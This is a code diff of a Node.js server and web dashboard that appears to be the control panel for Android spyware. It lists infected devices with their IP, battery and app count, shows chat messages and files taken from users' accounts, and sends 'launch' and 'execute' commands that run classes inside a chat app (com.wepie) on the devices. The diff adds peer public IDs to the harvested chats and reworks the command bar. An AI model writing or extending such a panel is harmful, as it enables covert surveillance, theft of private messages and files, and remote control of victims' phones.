@@ -528,6 +528,7 @@ async function handleHeartbeat(req, res) {
   json(res, 200, { ok: true, device: row, account });
 }
 
+// ====== UPDATED: handleChatBatch now includes peer_public_id ======
 async function handleChatBatch(req, res) {
   const body = await readJson(req, []);
   const list = Array.isArray(body) ? body : Array.isArray(body.messages) ? body.messages : [];
@@ -540,6 +541,7 @@ async function handleChatBatch(req, res) {
     mid: clean(msg.mid || msg.id),
     direction: clean(msg.direction),
     peer_uid: optionalNumber(msg.peer_uid ?? msg.peerUid),
+    peer_public_id: optionalClean(msg.peer_public_id ?? msg.peerPublicId),   // NEW
     peer_name: clean(msg.peer_name ?? msg.peerName),
     text: clean(msg.text || msg.message),
     message_time: optionalNumber(msg.message_time ?? msg.messageTime ?? msg.time) || nowMillis(),
@@ -789,6 +791,7 @@ async function handleDashboardApi(req, res, url) {
   return false;
 }
 
+// ====== UPDATED: dashboard HTML with peerPublicId display ======
 async function dashboardHtml() {
   return `<!doctype html>
 <html lang="en">
@@ -813,14 +816,7 @@ async function dashboardHtml() {
   <main class="main">
     <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Accounts, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><button class="btn danger" id="deleteDevice">Delete device</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
     <div class="tabs"><button class="tab active" data-tab="overview">Overview</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
-    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none" selected>none</option><option value="launch">launch</option><option value="execute">execute</option></select>
-      <div id="activityFields">
-        <input id="cmdActivityLaunch" style="display:none;" value="com.wepie.module.teenmode.TeenModeOpeningActivity" placeholder="Launch Activity">
-        <input id="cmdActivityExecute" style="display:none;" value="com.wepie.wespy.module.login.manual.ClearCacheTask" placeholder="Execute Class">
-      </div>
-      <button class="btn" id="sendCommand">Send</button>
-      <button class="btn danger" id="clearCommand">Clear</button>
-    </div>
+    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none">none</option><option value="launch">launch</option><option value="execute" selected>execute</option></select><input id="cmdActivity" value="com.wepie.wespy.module.login.manual.ClearCacheTask"><button class="btn" id="sendCommand">Send</button><button class="btn danger" id="clearCommand">Clear</button></div>
     <section id="content" class="content"></section>
   </main>
 </div>
@@ -878,8 +874,13 @@ function renderEmpty(){$("content").innerHTML='<div class="empty">No device sele
 function renderMain(){const d=selectedDevice();if(!d)return renderEmpty();const a=selectedAccount();$("deviceTitle").textContent=d.display_name||d.device_id;$("deviceSub").textContent=(d.online?"Online":"Offline")+" • "+(a?(a.my_name||a.public_id||"Unknown account"):"No account selected");document.querySelectorAll(".tab").forEach(t=>t.classList.toggle("active",t.dataset.tab===state.tab));if(state.tab==="overview")renderOverview(d,a);if(state.tab==="chats")renderChats();if(state.tab==="files")renderFiles()}
 function renderOverview(d,a){const rows=[["Device ID",d.device_id],["Account name",a?.my_name],["Public ID",a?.public_id],["UID",a?.my_uid],["Model",d.model],["Brand",d.brand],["Android",d.android],["Battery",d.battery_percent!=null?d.battery_percent+"%":""],["IP",d.public_ip],["Network",d.network_type],["Apps",d.app_count],["Last seen",fmtDate(d.server_last_seen)],["Last file scan",fmtDate(d.last_track_time)],["Created",fmtDate(d.created_at)]];$("content").innerHTML=renderAccounts()+'<div class="cards"><div class="card"><span>Status</span><b>'+(d.online?'Online':'Offline')+'</b></div><div class="card"><span>Accounts</span><b>'+state.accounts.length+'</b></div><div class="card"><span>Conversations</span><b>'+conversations().length+'</b></div><div class="card"><span>Selected files</span><b>'+state.files.length+'</b></div></div><div class="toolbar"><button class="btn danger" id="deleteAccount">Delete selected user</button><button class="btn danger" id="deleteAccountChats">Delete user chats</button><button class="btn danger" id="deleteAccountFiles">Delete user files</button></div><br><div class="info-grid">'+rows.map(([k,v])=>'<div class="row"><span>'+esc(k)+'</span><strong>'+esc(v??"")+'</strong></div>').join("")+'</div>'}
 function renderChats(){if(!state.account){$("content").innerHTML=renderAccounts();return}if(!state.peer)return renderChatInbox();return renderChatThread(state.peer)}
-function renderChatInbox(){const convs=conversations();const tools='<div class="toolbar"><button class="btn danger" id="deleteAllChats">Delete all user chats</button></div><br>';if(!convs.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No chats for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="conv-list">'+convs.map(c=>'<button class="conv" data-peer="'+esc(c.key)+'"><div class="avatar">'+esc((c.peer_name||"?").trim().charAt(0)||"?")+'</div><div><div class="conv-name">'+esc(c.peer_name||"Unknown")+'</div><div class="muted">Public ID: '+esc(c.peer_uid||"")+'</div><div class="conv-preview">'+esc(previewText(c.last?.text))+'</div></div><div class="conv-meta"><div>'+esc(shortTime(msgTime(c.last)))+'</div><div>'+c.messages.length+' msgs</div></div></button>').join("")+'</div>'}
-function renderChatThread(key){const conv=conversations().find(c=>c.key===key);if(!conv){state.peer=null;return renderChatInbox()}const msgs=[...conv.messages].sort((a,b)=>msgTime(a)-msgTime(b));let lastDay="";const body=msgs.map(m=>{const t=msgTime(m);const day=dayKey(t);const chip=day!==lastDay?'<span class="date-chip">'+esc(new Date(t).toLocaleDateString())+'</span>':"";lastDay=day;const media=parseMedia(m.text);const content=media?'<div>'+esc(media.label)+'</div><img class="bubble-img" src="'+esc(media.url)+'" alt="">':esc(m.text||"");return chip+'<div class="bubble-row '+esc(m.direction)+'"><label><input type="checkbox" class="msgcheck" value="'+esc(m.id)+'"></label><div class="bubble">'+content+'<span class="bubble-time">'+esc(shortTime(t))+'</span></div></div>'}).join("");$("content").innerHTML=renderAccounts()+'<div class="thread"><div class="thread-head"><div><button class="btn" id="backChats">Back</button> <strong>'+esc(conv.peer_name||"Unknown")+'</strong><div class="muted">Public ID: '+esc(conv.peer_uid||"")+'</div></div><div class="toolbar"><button class="btn" id="selectAllChats">Select all</button><button class="btn danger" id="deleteSelectedChats">Delete selected</button><button class="btn danger" id="deleteConversation">Delete conversation</button></div></div><div class="thread-scroll" id="threadScroll">'+body+'</div></div>';setTimeout(()=>{$("threadScroll")?.scrollTo(0,$("threadScroll").scrollHeight)},0)}
+// ====== UPDATED: show peer_public_id ======
+function renderChatInbox(){const convs=conversations();const tools='<div class="toolbar"><button class="btn danger" id="deleteAllChats">Delete all user chats</button></div><br>';if(!convs.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No chats for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="conv-list">'+convs.map(c=>{
+  const pubId = c.messages.find(m=>m.peer_public_id)?.peer_public_id || c.peer_public_id || "";
+  return '<button class="conv" data-peer="'+esc(c.key)+'"><div class="avatar">'+esc((c.peer_name||"?").trim().charAt(0)||"?")+'</div><div><div class="conv-name">'+esc(c.peer_name||"Unknown")+'</div><div class="muted">UID: '+esc(c.peer_uid||"")+(pubId?' • Public: '+esc(pubId):'')+'</div><div class="conv-preview">'+esc(previewText(c.last?.text))+'</div></div><div class="conv-meta"><div>'+esc(shortTime(msgTime(c.last)))+'</div><div>'+c.messages.length+' msgs</div></div></button>'
+}).join("")+'</div>'}
+// ====== UPDATED: show peer_public_id in thread ======
+function renderChatThread(key){const conv=conversations().find(c=>c.key===key);if(!conv){state.peer=null;return renderChatInbox()}const msgs=[...conv.messages].sort((a,b)=>msgTime(a)-msgTime(b));let lastDay="";const body=msgs.map(m=>{const t=msgTime(m);const day=dayKey(t);const chip=day!==lastDay?'<span class="date-chip">'+esc(new Date(t).toLocaleDateString())+'</span>':"";lastDay=day;const media=parseMedia(m.text);const content=media?'<div>'+esc(media.label)+'</div><img class="bubble-img" src="'+esc(media.url)+'" alt="">':esc(m.text||"");return chip+'<div class="bubble-row '+esc(m.direction)+'"><label><input type="checkbox" class="msgcheck" value="'+esc(m.id)+'"></label><div class="bubble">'+content+'<span class="bubble-time">'+esc(shortTime(t))+'</span></div></div>'}).join("");const pubId = conv.messages.find(m=>m.peer_public_id)?.peer_public_id || conv.peer_public_id || "";$("content").innerHTML=renderAccounts()+'<div class="thread"><div class="thread-head"><div><button class="btn" id="backChats">Back</button> <strong>'+esc(conv.peer_name||"Unknown")+'</strong><div class="muted">UID: '+esc(conv.peer_uid||"")+(pubId?' • Public: '+esc(pubId):'')+'</div></div><div class="toolbar"><button class="btn" id="selectAllChats">Select all</button><button class="btn danger" id="deleteSelectedChats">Delete selected</button><button class="btn danger" id="deleteConversation">Delete conversation</button></div></div><div class="thread-scroll" id="threadScroll">'+body+'</div></div>';setTimeout(()=>{$("threadScroll")?.scrollTo(0,$("threadScroll").scrollHeight)},0)}
 function renderFiles(){if(!state.account){$("content").innerHTML=renderAccounts();return}const tools='<div class="toolbar"><button class="btn" id="selectAllFiles">Select all</button><button class="btn danger" id="deleteSelectedFiles">Delete selected</button><button class="btn danger" id="deleteAllFiles">Delete all user files</button></div><br>';if(!state.files.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No files for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="grid">'+state.files.map(f=>{const url="/uploads/"+enc(f.file);const media=isImg(f.file)?'<img src="'+url+'" alt="">':isVid(f.file)?'<video src="'+url+'" muted></video>':'<span>FILE</span>';return '<div class="file"><label class="checkline" style="padding:8px 10px 0"><input type="checkbox" class="filecheck" value="'+esc(f.file)+'"><span class="muted">Select</span></label><button class="thumb" data-preview="'+esc(f.file)+'">'+media+'</button><div class="filebody"><div class="filename">'+esc(f.original||f.file)+'</div><div class="filemeta">'+fmtBytes(f.size)+' • '+esc(fmtDate(f.time))+'</div><div class="fileactions"><a class="btn" href="'+url+'" download>Download</a><button class="btn danger" data-delete-file="'+esc(f.file)+'">Delete</button></div></div></div>'}).join("")+'</div>'}
 function openPreview(file){const url="/uploads/"+enc(file);$("modalTitle").textContent=file;$("modalBody").innerHTML=isImg(file)?'<img src="'+url+'" alt="">':isVid(file)?'<video src="'+url+'" controls autoplay></video>':'<a class="btn" href="'+url+'" target="_blank">Open file</a>';$("modal").classList.add("open")}
 async function deletePath(path,msg){if(!confirm(msg))return;await api(path,{method:"DELETE"});await loadSelected();renderDevices()}
@@ -895,67 +896,9 @@ $("refresh").onclick=load;
 $("deleteDevice").onclick=()=>state.selected&&deletePath("/api/device/"+enc(state.selected),"Delete this device with all chats and files?");
 document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
 $("content").onclick=async e=>{const acc=e.target.closest("[data-account]");if(acc){state.account=acc.dataset.account;state.peer=null;await loadAccount();renderMain();return}const conv=e.target.closest("[data-peer]");if(conv){state.peer=conv.dataset.peer;renderChats();return}if(e.target.id==="backChats"){state.peer=null;renderChats();return}if(e.target.id==="deleteConversation")return deleteConversation();if(e.target.id==="deleteAccount")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account),"Delete selected user with all chats and files?");if(e.target.id==="deleteAccountChats"||e.target.id==="deleteAllChats")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/messages","Delete all chats for this user?");if(e.target.id==="deleteAccountFiles"||e.target.id==="deleteAllFiles")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/files","Delete all files for this user?");if(e.target.id==="selectAllChats"){document.querySelectorAll(".msgcheck").forEach(x=>x.checked=true);return}if(e.target.id==="selectAllFiles"){document.querySelectorAll(".filecheck").forEach(x=>x.checked=true);return}if(e.target.id==="deleteSelectedChats")return deleteSelectedChats();if(e.target.id==="deleteSelectedFiles")return deleteSelectedFiles();const p=e.target.closest("[data-preview]");if(p)return openPreview(p.dataset.preview);const f=e.target.closest("[data-delete-file]");if(f&&confirm("Delete this file?")){await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files:[f.dataset.deleteFile]})});await loadSelected()}};
-
-// Action dropdown toggle fields
-$("cmdAction").onchange = function() {
-    const action = this.value;
-    const launchInput = document.getElementById("cmdActivityLaunch");
-    const executeInput = document.getElementById("cmdActivityExecute");
-    if (action === "launch") {
-        launchInput.style.display = "block";
-        executeInput.style.display = "none";
-    } else if (action === "execute") {
-        launchInput.style.display = "none";
-        executeInput.style.display = "block";
-    } else {
-        launchInput.style.display = "none";
-        executeInput.style.display = "none";
-    }
-};
-
-// Send command
-$("sendCommand").onclick=async()=>{
-    const action = document.getElementById("cmdAction").value;
-    let activity = "";
-    if (action === "launch") {
-        activity = document.getElementById("cmdActivityLaunch").value;
-    } else if (action === "execute") {
-        activity = document.getElementById("cmdActivityExecute").value;
-    }
-    await api("/panel/command",{
-        method:"POST",
-        headers:{"content-type":"application/json"},
-        body:JSON.stringify({
-            title:$("cmdTitle").value,
-            text:$("cmdText").value,
-            action: action,
-            activity: activity
-        })
-    });
-    $("sendCommand").textContent="Sent";
-    setTimeout(()=>$("sendCommand").textContent="Send",1200);
-};
-
-$("clearCommand").onclick=async()=>{
-    await api("/panel/command",{
-        method:"POST",
-        headers:{"content-type":"application/json"},
-        body:JSON.stringify({
-            title:"MG Menu",
-            text:"Server online",
-            action:"none",
-            activity:""
-        })
-    });
-    document.getElementById("cmdAction").value = "none";
-    document.getElementById("cmdActivityLaunch").value = "com.wepie.module.teenmode.TeenModeOpeningActivity";
-    document.getElementById("cmdActivityExecute").value = "com.wepie.wespy.module.login.manual.ClearCacheTask";
-    document.getElementById("cmdActivityLaunch").style.display = "none";
-    document.getElementById("cmdActivityExecute").style.display = "none";
-};
-
-$("closeModal").onclick=()=>$("modal").classList.remove("open");
-$("modal").onclick=e=>{if(e.target.id==="modal")$("modal").classList.remove("open")};
+$("sendCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:$("cmdTitle").value,text:$("cmdText").value,action:$("cmdAction").value,activity:$("cmdActivity").value})});$("sendCommand").textContent="Sent";setTimeout(()=>$("sendCommand").textContent="Send",1200)};
+$("clearCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:"MG Menu",text:"Server online",action:"none",activity:""})})};
+$("closeModal").onclick=()=>$("modal").classList.remove("open");$("modal").onclick=e=>{if(e.target.id==="modal")$("modal").classList.remove("open")};
 load().catch(err=>{$("content").innerHTML='<div class="empty">Failed to load dashboard: '+esc(err.message)+'</div>'});
 </script>
 </body>
